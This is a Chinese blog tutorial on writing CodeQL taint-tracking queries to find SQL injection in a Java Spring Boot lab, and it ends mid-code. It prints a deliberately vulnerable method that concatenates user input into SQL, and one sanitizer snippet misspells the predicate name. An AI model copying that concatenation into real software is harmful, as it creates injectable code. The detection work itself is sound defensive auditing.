href="https://lgtm.com/query/4032913402499547882/">查询</a>可以找到（原始）类型 Map 的变量。实际上，现在仍然有许多项目在使用原始类型的 Map。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Variable v ,RawType rt</span><br><span class="line"><span class="type">where</span> <span class="variable">rt</span> <span class="operator">=</span> v.getType() and rt.getSourceDeclaration().hasQualifiedName(<span class="string">&quot;java.util&quot;</span>, <span class="string">&quot;Map&quot;</span>)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><h4 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h4><p>类 <code>Variable</code> 表示 Java 中的变量，它可以是一个类的成员字段（无论是否静态），也可以是一个局部变量，或者是函数的参数。因此，有三个子类来满足这些特殊情况的需要。</p><ul><li><code>Field</code> ：字段</li><li><code>LocalVariableDecl</code> ：本地变量.</li><li><code>Parameter</code> ：方法或构造函数的参数。</li></ul><h3 id="AST抽象语法树"><a href="#AST抽象语法树" class="headerlink" title="AST抽象语法树"></a>AST抽象语法树</h3><p>该类中包含了抽象语法树的节点，也就是语句（QL 中的类 <code>Stmt</code>）和表达式（QL 中的类 <code>Expr</code>）。关于标准 QL 库中可用的表达式和语句类型的完整列表，可以参考  <a href="https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-java-programs/">https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-java-programs/</a></p><p><code>Expr</code> 和 <code>Stmt</code> 都提供了成员谓词来获取程序的抽象语法树：</p><ul><li><code>Expr.getAChildExpr</code> 返回一个给定表达式的子表达式。</li><li><code>Stmt.getAChild</code> 返回直接嵌套在给定语句中的语句或表达式。</li><li><code>Expr.getParent</code> 和 <code>Stmt.getParent</code> 返回 AST 节点的父节点</li></ul><p>下面的<a href="https://lgtm.com/query/1947757851560375919/">查询</a>可以找到所有父类为返回语句的表达式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Expr e</span><br><span class="line"><span class="keyword">where</span> e.getParent() instanceof ReturnStmt</span><br><span class="line"><span class="keyword">select</span> e</span><br></pre></td></tr></table></figure><p>因此，程序中如果包含：<code>return x + y</code> 子表达式，QL 的查询结果将会返回：<code>x + y</code>。</p><p>下面的<a href="https://lgtm.com/query/1989464153689219612/">查询</a>可以找到某个表达式的父级为 if 语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Stmt s</span><br><span class="line">where s.getParent() <span class="keyword">instanceof</span> IfStmt</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>一个<a href="https://lgtm.com/query/1016821702972128245/">查询</a>的例子，可以找到方法体。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Stmt s </span><br><span class="line">where s.getParent() <span class="keyword">instanceof</span> Method</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>如上的这些例子可知，表达式的父节点并不总是表达式：它也可能是一个语句，例如 <code>IfStmt</code>。同样，语句的父节点也不总是一个语句：它也可能是一个方法或构造函数。为了抓住这一点，QL Java 库提供了两个抽象类 <code>ExprParent</code> 和 <code>StmtParent</code>，前者代表可能是表达式的父节点的任何节点，后者代表可能是语句的父节点的任何节点。</p><h3 id="Metadata（元数据）"><a href="#Metadata（元数据）" class="headerlink" title="Metadata（元数据）"></a>Metadata（元数据）</h3><p>除了 Java 程序代码本身之外，Java 程序还有几种元数据。其中包括有注解(Annotations) 和 Javadoc 注释。由于这些元数据对于加强代码分析或者是作为分析目标本身都很有用处，因此，QL 库定义了用于访问这些元数据的类。</p><p>对于注解(Annotations)，类 <code>Annotatable</code> 是所有可以被注解的程序元素的超类。这包括包、引用类型、字段、方法、构造函数和声明的局部变量。对于每个这样的元素，类中的谓词 <code>getAnAnnotation</code> 可以检索该元素可能有的任何注释。例如，下面的<a href="https://lgtm.com/query/3206112561297137365/">查询</a>可以找到构造函数上的所有注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Constructor c </span><br><span class="line">select c.getAnAnnotation()</span><br></pre></td></tr></table></figure><h3 id="设置-source和sink"><a href="#设置-source和sink" class="headerlink" title="设置 source和sink"></a>设置 source和sink</h3><p>在自动化代码安全审计论中有一个核心的三元组概念：source,sink，sanitizer</p><blockquote><p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p></blockquote><p>只有source和sink同时存在，并且从source到sink的链路是通的，才表示当前的漏洞是存在的。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207145013.png"></p><p>新定义的 <code>Config</code> 类继承于 <code>TaintTracking::Configuration</code>。类中重载的 <code>isSource</code> 谓语定义为污点的源头，而 <code>isSink</code> 定义为污点汇聚点。</p><p>在codeql中，我们通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node src)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>来设置source</p><p>那么，我们在此靶场中的source是什么？</p><p>可以看到，我们所使用的是Springboot的框架，那么source就是http参数入口的代码参数，在<code>controller</code>中可以找到</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207145408.png"></p><p>这里的source就是<code>username</code></p><p><img src="C:\Users\12451\AppData\Roaming\Typora\typora-user-images\image-20211207145542653.png" alt="image-20211207145542653"></p><p>同理，这里的source就是<code>Student</code>对象</p><p>但是，在这里，我们将source设置为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node src)</span> &#123; src <span class="keyword">instanceof</span> RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是SDK自带的规则，里面包含了大多数常用的Source入口，其中也包括Springboot，我们可以直接使用</p><p>instance则是codeql提供的语法</p></blockquote><p>在codeql中，我们通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来设置sink</p><p>在这里，我们将query方法(Method)的调用(MethodAccess)，所以我们设置sink为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>设置好了source和sink，我们就相当于搞定了首和尾，但是，只有连通才能决定是否存在漏洞</p><p>一个受污染的变量，能够毫无阻拦的流传到危险函数，就证明存在漏洞。</p><p>这个连通工作就是使用codeql引擎本身来完成的。我们通过使用config.hasFlowPath(source,sink)来判断是否连通，</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, <span class="string">&quot;source&quot;</span></span><br></pre></td></tr></table></figure><p>我们传递给了config.hasFlowPath(Source,sink)我们定义好的source和sink，系统会自动帮我们判断是否存在漏洞</p><h2 id="初步codeql代码"><a href="#初步codeql代码" class="headerlink" title="初步codeql代码"></a>初步codeql代码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @id java/examples/vuldemo</span></span><br><span class="line"><span class="comment"> * @name Sql-Injection</span></span><br><span class="line"><span class="comment"> * @description Sql-Injection</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this <span class="operator">=</span> &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      <span class="keyword">and</span></span><br><span class="line">      call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>注意：上面的注释和其他语言是不一样的，不能删除，也是程序的一部分。因为我们在生成测试报告的时候，上面的name，description等信息会写入审计报告中。</p><p>这样，我们就拿到了最终的漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207160825.png"></p><h2 id="错误修改"><a href="#错误修改" class="headerlink" title="错误修改"></a>错误修改</h2><p>我们发现，上面自动审计出来的漏洞中，发现了一个误报</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207161032.png"></p><p>这个方法的参数是 List&lt;long&gt;，不可能存在注入漏洞</p><p>这说明，我们的规则里，对于List&lt;long&gt;型，甚至List&lt;Integer&gt;类型都会产生误报。source误把这种类型的参数涵盖了</p><p>我们需要采取手段消除这种误报,这个手段就是<code>isSanitizer</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207161647.png"></p><blockquote><p>isSanitizer是codeql的类TaintTracking::Configuration提供的净化方法。他的函数是：</p><p>override predicate isSanitizer(DataFlow::Node node){}</p><p>在Codeql自带的默认规则里，对当前的节点做了相应的判断</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSantizer(DataFlow::Node node)&#123;</span><br><span class="line"></span><br><span class="line">node.getType() instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">node.getType() instanceof BoxedType <span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在</p><p>由于Codeql检测SQL注入里的isSanitizer方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报的问题</p><p>那么我们只要将这种符合类型的方法加入到isSanitizer，即可消除这种误报</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSanitizer</span><span class="params">(DataFlow::Node node)</span> &#123;</span><br><span class="line">    node.getType() <span class="keyword">instanceof</span> PrimitiveType or</span><br><span class="line">    node.getType() <span class="keyword">instanceof</span> BoxedType or</span><br><span class="line">    node.getType() <span class="keyword">instanceof</span> NumberType or</span><br><span class="line">    <span class="title function_">exists</span><span class="params">(ParameterizedType pt| node.getType()</span> = pt and pt.getTypeArgument(<span class="number">0</span>) <span class="keyword">instanceof</span> NumberType )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思是：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。</p><p>重新执行query，发现误报已经消除。</p><h2 id="修改2"><a href="#修改2" class="headerlink" title="修改2"></a>修改2</h2><p>我们发现，如下的sql没有被codeql捕捉到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudentWithOptional</span><span class="params">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlWithOptional</span> <span class="operator">=</span> <span class="string">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。</p><p>那我们如果通过CodeQL来解决漏报问题呢？答案就是通过<code>isAdditionalTaintStep</code>方法。</p><p>实现原理就是：&#x3D;&#x3D;断了就给他接上&#x3D;&#x3D;</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207163443.png"></p><p>isAddtionalTaintStep方法是Codeql的类TainTracking::Configuration提供的方法，他的原型是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isAdditionalTaintStep</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>他的作用是<code>将一个可控节点A强制传递给另外一个节点B，那么节点B也就成了可控节点</code></p><p>多次测试以后，发现是<code>username.get()</code>断掉了，大概是因为<code>Optional</code>这种类型的使用没有在Codeql语法库里</p><p>那么，我们让username强制流转到<code>username.get()</code>，这样username.get()就变得可控了，这样就能识别出这个注入漏洞了。</p><p>修改codeql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @id java/examples/vuldemo</span></span><br><span class="line"><span class="comment"> * @name Sql-Injection</span></span><br><span class="line"><span class="comment"> * @description Sql-Injection</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span>, MethodAccess call1 <span class="operator">|</span> expSrc <span class="operator">=</span> call1.getArgument(<span class="number">0</span>) <span class="keyword">and</span> expDest<span class="operator">=</span><span class="keyword">call</span> <span class="keyword">and</span> call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span> method.hasName(&quot;get&quot;) <span class="keyword">and</span> method.getDeclaringType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot; <span class="keyword">and</span> call1.getArgument(<span class="number">0</span>).getType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot;  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this <span class="operator">=</span> &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof BoxedType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof NumberType <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">exists</span>(ParameterizedType pt<span class="operator">|</span> node.getType() <span class="operator">=</span> pt <span class="keyword">and</span> pt.getTypeArgument(<span class="number">0</span>) instanceof NumberType )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      <span class="keyword">and</span></span><br><span class="line">      call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>上述，我们实现了一个<code>isTaintedString</code>谓词，并使用exists子查询方式实现了强制把<code>Optional&lt;String&gt; username</code>关联<code>    Optional&lt;String&gt; username.get()</code></p><p>最后，注入就可以被跑出来了</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207164341.png"></p><p>我们就简单粗暴的把数据流连通了。</p><h2 id="Lombok问题"><a href="#Lombok问题" class="headerlink" title="Lombok问题"></a>Lombok问题</h2><p>lombok是非常有名的java类，通过注解省略了很多不必要的臃肿代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.l4yn3.microserviceseclab.data;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，这样的话，由注解生成的代码，导致codeql无法获取到lombok自动生成的代码，所以就导致使用了lombok的代码即使存在漏洞，也无法被识别的问题</p><p>再codeql里的issue里面，有人给出了这个问题的解决办法,如下</p><p><a href="https://github.com/github/codeql/issues/4984#:~:text=Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A">https://github.com/github/codeql/issues/4984#:~:text&#x3D;Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># get a copy of lombok.jar</span><br><span class="line">wget https:<span class="comment">//projectlombok.org/downloads/lombok.jar -O &quot;lombok.jar&quot;</span></span><br><span class="line"># run <span class="string">&quot;delombok&quot;</span> on the source files and write the generated files to a folder named <span class="string">&quot;delombok&quot;</span></span><br><span class="line">java -jar <span class="string">&quot;lombok.jar&quot;</span> delombok -n --onlyChanged . -d <span class="string">&quot;delombok&quot;</span></span><br><span class="line"># remove <span class="string">&quot;generated by&quot;</span> comments</span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -exec sed <span class="string">&#x27;/Generated by delombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"># remove any left-over <span class="keyword">import</span> statements</span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -exec sed <span class="string">&#x27;/import lombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"># copy delombok<span class="string">&#x27;d files over the original ones</span></span><br><span class="line"><span class="string">cp -r &quot;delombok/.&quot; &quot;./&quot;</span></span><br><span class="line"><span class="string"># remove the &quot;delombok&quot; folder</span></span><br><span class="line"><span class="string">rm -rf &quot;delombok&quot;</span></span><br></pre></td></tr></table></figure><p>上面实现的功能是，去掉代码里lombok注解，并且还原<code>getter</code>和<code>setter</code>方法的java代码，从而使得codeql的flow流能够顺利流下去。从而检索到相应的漏洞</p><p>(根据对应的操作系统自动转化相应的方法)</p><h2 id="最终优化"><a href="#最终优化" class="headerlink" title="最终优化"></a>最终优化</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span> <span class="variable">@id</span> java<span class="operator">/</span>examples<span class="operator">/</span>vuldemo</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@name</span> <span class="keyword">Sql</span><span class="operator">-</span>Injection</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@description</span> <span class="keyword">Sql</span><span class="operator">-</span>Injection</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@kind</span> path<span class="operator">-</span>problem</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@problem</span>.severity warning</span><br><span class="line"> <span class="operator">*</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span>, MethodAccess call1 <span class="operator">|</span> expSrc <span class="operator">=</span> call1.getArgument(<span class="number">0</span>) <span class="keyword">and</span> expDest<span class="operator">=</span><span class="keyword">call</span> <span class="keyword">and</span> call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span> method.hasName(&quot;get&quot;) <span class="keyword">and</span> method.getDeclaringType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot; <span class="keyword">and</span> call1.getArgument(<span class="number">0</span>).getType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot;  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this <span class="operator">=</span> &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof BoxedType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof NumberType <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">exists</span>(ParameterizedType pt<span class="operator">|</span> node.getType() <span class="operator">=</span> pt <span class="keyword">and</span> pt.getTypeArgument(<span class="number">0</span>) instanceof NumberType )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span 